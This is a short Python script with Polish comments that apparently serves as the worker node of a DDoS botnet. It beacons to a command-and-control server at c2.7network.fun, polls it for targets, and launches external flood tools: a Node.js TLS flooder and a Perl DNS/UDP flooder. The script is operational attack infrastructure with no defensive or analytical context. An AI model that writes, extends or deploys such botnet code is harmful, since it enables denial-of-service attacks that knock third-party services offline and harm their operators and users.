import requests
import time
import subprocess
import threading
import socket

MAIN_VPS = "http://c2.7network.fun:7978"  # <-- wpisz IP main VPS
WORKER_ID = socket.gethostname()  # automatyczny unikalny id

def send_heartbeat():
    while True:
        try:
            requests.post(f"{MAIN_VPS}/heartbeat", json={"worker_id": WORKER_ID}, timeout=5)
        except Exception as e:
            print("Heartbeat error:", e)
        time.sleep(10)

threading.Thread(target=send_heartbeat, daemon=True).start()

while True:
    try:
        r = requests.get(f"{MAIN_VPS}/api/get_task", params={"worker_id": WORKER_ID})
        data = r.json()
        if data.get("target"):
            target = data["target"]
            t = data["time"]
            method = data.get("method", "tls")
            port = data.get("port", "443")
            if method == "tls":
                print(f"[TLS] node web1.js {target} {t}")
                subprocess.Popen(["node", "web1.js", target, t])
            elif method == "dns":
                print(f"[DNS] perl god.pl {target} {port} 65500 {t}")
                subprocess.Popen(["perl", "god.pl", target, port, "65500", t])
            else:
                print(f"Nieznana metoda: {method}")
    except Exception as e:
        print("Błąd:", e)
    time.sleep(5)  # co 5 sekund pyta o zadanie 
